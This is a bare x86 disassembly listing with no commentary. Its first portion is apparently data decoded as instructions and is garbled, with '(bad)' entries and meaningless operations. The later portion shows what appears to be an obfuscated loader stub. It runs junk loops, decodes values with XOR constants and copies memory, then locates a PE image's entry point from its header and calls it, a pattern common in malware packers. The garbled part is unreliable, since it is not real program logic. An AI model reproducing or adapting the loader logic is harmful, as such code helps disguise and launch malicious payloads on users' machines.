  40d5b3:	lahf   
  40d5b4:	fistp  DWORD PTR [ebx+0x72]
  40d5b7:	pop    ss
  40d5b8:	cmp    al,0x24
  40d5ba:	or     eax,0x90d026ca
  40d5bf:	fwait
  40d5c0:	out    dx,al
  40d5c1:	call   FWORD PTR [edi-0x5f]
  40d5c4:	imul   DWORD PTR [edi]
  40d5c6:	test   esp,esi
  40d5c8:	sub    bl,0xd5
  40d5cb:	ss scas al,BYTE PTR es:[edi]
  40d5cd:	jno    0x40d614
  40d5cf:	popf   
  40d5d0:	or     al,0xf3
  40d5d2:	pop    edx
  40d5d3:	push   eax
  40d5d4:	jae    0x40d652
  40d5d6:	xor    al,0xd
  40d5d8:	or     BYTE PTR [esi+0x7afc8a9a],bh
  40d5de:	cmp    al,BYTE PTR [ebx-0x79]
  40d5e1:	push   0x4f79096b
  40d5e6:	mov    al,BYTE PTR [ecx]
  40d5e8:	cdq    
  40d5e9:	cdq    
  40d5ea:	cmc    
  40d5eb:	ficomp DWORD PTR [ebp+0x1a]
  40d5ee:	or     eax,0xbd17862e
  40d5f3:	dec    ecx
  40d5f4:	dec    esp
  40d5f5:	out    dx,al
  40d5f6:	jno    0x40d5d4
  40d5f8:	daa    
  40d5f9:	push   esi
  40d5fa:	mov    esi,0xdb75276
  40d5ff:	pop    ebp
  40d600:	mov    edi,0x53977363
  40d605:	lea    eax,ds:0x497833ad
  40d60b:	and    al,0x70
  40d60d:	pop    edi
  40d60e:	rcl    esp,cl
  40d610:	push   0xffffffc0
  40d612:	add    ecx,DWORD PTR [eax+ecx*2-0x13]
  40d616:	push   edx
  40d617:	aaa    
  40d618:	add    DWORD PTR [ebx],edx
  40d61a:	push   ebp
  40d61b:	pop    esp
  40d61c:	sub    BYTE PTR [ecx-0x13],0x46
  40d620:	inc    esp
  40d621:	scas   al,BYTE PTR es:[edi]
  40d622:	xchg   esp,eax
  40d623:	inc    edi
  40d624:	dec    ebp
  40d625:	(bad)  
  40d627:	mov    gs,WORD PTR [ebx]
  40d629:	jmp    0x40d606
  40d62b:	xor    cl,ah
  40d62d:	fistp  DWORD PTR ds:[ecx+eiz*2+0x16]
  40d632:	gs or  ebx,ecx
  40d635:	push   0x76
  40d637:	mov    esi,0x8ae11c15
  40d63c:	or     BYTE PTR [ecx],bh
  40d63e:	mov    bl,0xb2
  40d640:	jb     0x40d6b7
  40d642:	daa    
  40d643:	fiadd  DWORD PTR [edi+0x41]
  40d646:	dec    edx
  40d647:	or     DWORD PTR [ecx],0x39
  40d64a:	jns    0x40d5e1
  40d64c:	mov    eax,0xecc2f002
  40d651:	dec    ecx
  40d652:	(bad)  
  40d653:	iret   
  40d654:	cmp    DWORD PTR [ecx],ebp
  40d656:	repz mov dh,0x7d
  40d659:	std    
  40d65a:	jne    0x40d697
  40d65c:	inc    ecx
  40d65d:	pop    esp
  40d65e:	fmul   QWORD PTR [esi]
  40d660:	push   esp
  40d661:	mov    eax,ds:0x67052f9d
  40d666:	inc    eax
  40d667:	stos   DWORD PTR es:[edi],eax
  40d668:	jo     0x40d6c5
  40d66a:	jge    0x40d6a1
  40d66c:	repz out dx,al
  40d66e:	fwait
  40d66f:	push   eax
  40d670:	jb     0x40d63c
  40d672:	pop    esi
  40d673:	mov    ah,0x8b
  40d675:	ss mov edx,0xa49d5a5b
  40d67b:	sbb    DWORD PTR [eax+0x34],esp
  40d67e:	mov    dh,0x7e
  40d680:	push   ss
  40d681:	shl    bh,cl
  40d683:	ret    
  40d684:	in     eax,0xc1
  40d686:	fwait
  40d687:	ror    al,cl
  40d689:	es dec esp
  40d68b:	cwde   
  40d68c:	das    
  40d68d:	loope  0x40d663
  40d68f:	je     0x40d686
  40d691:	fist   WORD PTR [edx-0xa86f798]
  40d697:	jg     0x40d6df
  40d699:	or     cl,BYTE PTR [esi-0x28]
  40d69c:	xor    bh,0x3d
  40d69f:	push   es
  40d6a0:	mov    al,ds:0xd31edf93
  40d6a5:	mov    esi,0x8356f783
  40d6aa:	(bad)  
  40d6ac:	cmp    esp,DWORD PTR [ecx+0x49]
  40d6af:	pop    ebp
  40d6b0:	ds out dx,eax
  40d6b2:	call   0x496f:0xce34a1ea
  40d6b9:	xor    DWORD PTR [edi+0x7cbb71c5],eax
  40d6bf:	fstp   DWORD PTR [ebx+0x1c32a1bc]
  40d6c5:	xor    al,0x7c
  40d6c7:	adc    DWORD PTR [ebx+edi*1+0x35],edx
  40d6cb:	mov    ebp,0xf1c78063
  40d6d0:	push   eax
  40d6d1:	outs   dx,DWORD PTR ds:[esi]
  40d6d2:	sub    DWORD PTR [ebx],edi
  40d6d4:	scas   eax,DWORD PTR es:[edi]
  40d6d5:	xor    al,0xd
  40d6d7:	dec    edx
  40d6d8:	and    eax,0x915b79c4
  40d6dd:	xchg   edx,eax
  40d6de:	and    dh,BYTE PTR [ebp-0x3d]
  40d6e1:	dec    eax
  40d6e2:	in     al,dx
  40d6e3:	and    ebx,edi
  40d6e5:	add    al,0xf1
  40d6e7:	call   0xc714:0xd15053ff
  40d6ee:	popa   
  40d6ef:	aas    
  40d6f0:	jecxz  0x40d6d2
  40d6f2:	push   edi
  40d6f3:	add    al,0x21
  40d6f5:	xor    ebx,edi
  40d6f7:	ds dec esi
  40d6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6fa:	cmp    eax,0xe8d6f643
  40d6ff:	mov    ah,0xde
  40d701:	gs dec ecx
  40d703:	adc    eax,0x7f822a39
  40d708:	daa    
  40d709:	or     ebx,ecx
  40d70b:	cmp    esi,DWORD PTR [esi]
  40d70d:	scas   al,BYTE PTR es:[edi]
  40d70e:	das    
  40d70f:	mov    al,0x6d
  40d711:	test   DWORD PTR [ecx],esi
  40d713:	cs int 0x3a
  40d716:	fdiv   st,st(6)
  40d718:	ficomp WORD PTR [edi+0x22cda8a1]
  40d71e:	sbb    eax,0x9fab60b9
  40d723:	(bad)  
  40d724:	push   0xa4133d73
  40d729:	mov    DWORD PTR [ecx],eax
  40d72b:	sub    al,0x29
  40d72d:	jne    0x40d6b7
  40d72f:	mov    ebx,edx
  40d731:	sbb    ch,BYTE PTR [eax-0x7a8d0b1d]
  40d737:	in     al,dx
  40d738:	ins    BYTE PTR es:[edi],dx
  40d739:	mov    al,0x7c
  40d73b:	inc    eax
  40d73c:	sub    DWORD PTR [ebp+eiz*8+0x644570eb],edx
  40d743:	repnz or al,0x2b
  40d746:	add    BYTE PTR [eax+0x179532db],bh
  40d74c:	adc    eax,0x1bf5f446
  40d751:	lahf   
  40d752:	pop    ecx
  40d753:	in     eax,0xa3
  40d755:	(bad)  
  40d756:	popa   
  40d757:	retf   0xe708
  40d75a:	pop    esp
  40d75b:	push   ebp
  40d75c:	mov    eax,ds:0xc8a2b4c3
  40d761:	cmp    DWORD PTR [ebp-0x5ca950f7],0x36
  40d768:	mov    WORD PTR [ebx-0x5e8a3d4d],?
  40d76e:	or     BYTE PTR [edx+0x63],ch
  40d771:	in     al,0xa0
  40d773:	in     al,dx
  40d774:	push   edi
  40d775:	mov    ch,0xdf
  40d777:	out    0xa3,al
  40d779:	es jno 0x40d74f
  40d77c:	pop    edi
  40d77d:	pop    ds
  40d77e:	ret    0x955b
  40d781:	push   0x59
  40d783:	xor    BYTE PTR [ecx-0x25cc7c25],dh
  40d789:	mov    al,0x7c
  40d78b:	inc    edx
  40d78c:	cmp    BYTE PTR [ecx+edx*8-0x1c7e20ca],0x34
  40d794:	inc    ebx
  40d795:	loop   0x40d776
  40d797:	stos   DWORD PTR es:[edi],eax
  40d798:	inc    edi
  40d799:	sub    esp,DWORD PTR [esi]
  40d79b:	sub    al,0x65
  40d79d:	stc    
  40d79e:	adc    esi,DWORD PTR [edi-0x77670eed]
  40d7a4:	mov    bl,0xa2
  40d7a6:	pop    ds
  40d7a7:	ja     0x40d816
  40d7a9:	loopne 0x40d7d0
  40d7ab:	dec    edx
  40d7ac:	sbb    bh,BYTE PTR [edx-0x1f3e0398]
  40d7b2:	mov    al,bl
  40d7b4:	inc    ebx
  40d7b5:	(bad)  
  40d7b6:	cwde   
  40d7b7:	mov    al,BYTE PTR [ecx-0x67]
  40d7ba:	sub    eax,0xf60fa57d
  40d7bf:	jno    0x40d7c0
  40d7c1:	ret    0x386c
  40d7c4:	pushf  
  40d7c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7c6:	sbb    al,0x1a
  40d7c8:	test   BYTE PTR ds:0xc0e55123,al
  40d7ce:	scas   al,BYTE PTR es:[edi]
  40d7cf:	xchg   edi,eax
  40d7d0:	xor    edi,DWORD PTR [ecx]
  40d7d2:	jge    0x40d775
  40d7d4:	rcl    BYTE PTR [ecx-0x4c],0xdc
  40d7d8:	(bad)  
  40d7d9:	xchg   edx,eax
  40d7da:	nop
  40d7db:	add    ah,al
  40d7dd:	push   esp
  40d7de:	fdivr  QWORD PTR [eax+0x748a8a70]
  40d7e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7e5:	int    0x2d
  40d7e7:	ins    BYTE PTR es:[edi],dx
  40d7e8:	cwde   
  40d7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ea:	push   esp
  40d7eb:	and    ch,BYTE PTR [edx+0x49]
  40d7ee:	jl     0x40d84e
  40d7f0:	or     eax,DWORD PTR [eax]
  40d7f2:	dec    esp
  40d7f3:	inc    edi
  40d7f4:	mov    cl,0x1b
  40d7f6:	jg     0x40d865
  40d7f8:	aaa    
  40d7f9:	sar    BYTE PTR [ecx],0xbe
  40d7fc:	aad    0x49
  40d7fe:	inc    esi
  40d7ff:	(bad)  
  40d800:	pop    edi
  40d801:	stc    
  40d802:	pop    ebx
  40d803:	push   ecx
  40d804:	adc    al,BYTE PTR [eax]
  40d806:	and    ebp,ecx
  40d808:	stos   DWORD PTR es:[edi],eax
  40d809:	(bad)
  40d80c:	xchg   BYTE PTR [eax-0x8],bl
  40d80f:	sub    eax,0x716ce7ed
  40d814:	pop    ss
  40d815:	call   0x5e2f8503
  40d81a:	push   esp
  40d81b:	sbb    ecx,DWORD PTR ds:0x7a3a025f
  40d821:	mov    ah,0x57
  40d823:	adc    dh,BYTE PTR [ecx]
  40d825:	arpl   WORD PTR [edi+0x8],si
  40d828:	ret    
  40d829:	mov    ebx,0x34d427cf
  40d82e:	scas   eax,DWORD PTR es:[edi]
  40d82f:	sub    al,0xad
  40d831:	out    0x95,eax
  40d833:	xchg   ebp,eax
  40d834:	cmp    BYTE PTR [esi+0x4ac9384b],bl
  40d83a:	(bad)  
  40d83b:	mov    eax,ds:0xffdbfe9c
  40d840:	out    0x81,al
  40d842:	or     esp,DWORD PTR [ebx]
  40d844:	add    DWORD PTR [edx-0xa3da219],ecx
  40d84a:	add    BYTE PTR [eax+0x3e],al
  40d84d:	sti    
  40d84e:	add    al,0x1e
  40d850:	mov    ecx,eax
  40d852:	inc    BYTE PTR [ebp+0x7c]
  40d855:	cmp    ebx,esi
  40d857:	or     esp,DWORD PTR [edx+0x6]
  40d85a:	inc    edi
  40d85b:	xor    esi,edx
  40d85d:	fisub  DWORD PTR [edi]
  40d85f:	cmp    eax,0xf42c9cd7
  40d864:	push   ds
  40d865:	popa   
  40d866:	ins    BYTE PTR es:[edi],dx
  40d867:	mov    dh,0x2a
  40d869:	cmp    edx,DWORD PTR [esp+edx*1]
  40d86c:	ins    BYTE PTR es:[edi],dx
  40d86d:	call   FWORD PTR [ecx+0x57]
  40d870:	icebp  
  40d871:	inc    ecx
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fd69,0x42e19c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fdf6,0x42fd71
  40d8af:	call   DWORD PTR ds:0x42e517
  40d8b5:	and    DWORD PTR ds:0x42fd7d,0x42fe02
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e1b4,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e1a4,0x42fd69
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e58f
  40d8ee:	sbb    DWORD PTR ds:0x42e77b,0x42fdf2
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fd75,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e4d7
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd85,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fdf6,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e1a4,0x42e777
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fdee,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fd6d,0x42e198
  40d977:	call   DWORD PTR ds:0x42e51f
  40d97d:	mov    DWORD PTR ds:0x42e19c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e40f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd81,0x42e1b4
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fd6d,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e37b
  40d9be:	mov    DWORD PTR ds:0x42fe0a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e198,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fd75,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fd75
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fd75,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fd75,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e20d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e5cf
  40da20:	cmp    DWORD PTR ds:0x42fd75,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fd75
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fd75,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fd75,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e783,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e773,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fd51,0x42e19c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd85,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd85,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd85,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e5d3
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd85
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd85,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e787,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e787,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e787,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e4e3
  40dae4:	cmp    DWORD PTR ds:0x42e787,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e787
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e787,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e787
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e787,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e77f,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e77f,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e77f,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e5d7
  40db41:	cmp    DWORD PTR ds:0x42e77f,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e77f
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e77f,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e77f
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e77f,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fdf6,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fdf6,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fdf6,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e5db
  40db97:	cmp    DWORD PTR ds:0x42fdf6,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e787,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e793,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fdfe,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fd65,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fd65
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fd65,edi
  40dc13:	cmp    DWORD PTR ds:0x42fd65,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fd65,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e4e7
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e1a8,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd81,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd89,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e777,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e777,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e777,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e4eb
  40dcaa:	cmp    DWORD PTR ds:0x42e777,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e777
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e777,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e777
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e777,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe02,0x42e1ac
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe02,0x42e1a4
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fd51,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e198,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fdf2,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fdf2,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fdf2,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e4ef
  40dd4f:	cmp    DWORD PTR ds:0x42fdf2,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd8d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e1b0,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd89,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe06,0x42fd7d
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e773,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e77f,0x42fe0a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e76b
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fd65,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fd65
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fd65,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fd65,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd89
  40de0d:	push   0x42e2ed
  40de12:	call   DWORD PTR ds:0x42e4f3
  40de18:	cmp    DWORD PTR ds:0x42fd65,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fda1
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fd7d,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fd75,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fd75,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fd75,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e5df
  40de65:	mov    edx,DWORD PTR ds:0x42fd75
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fd75,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
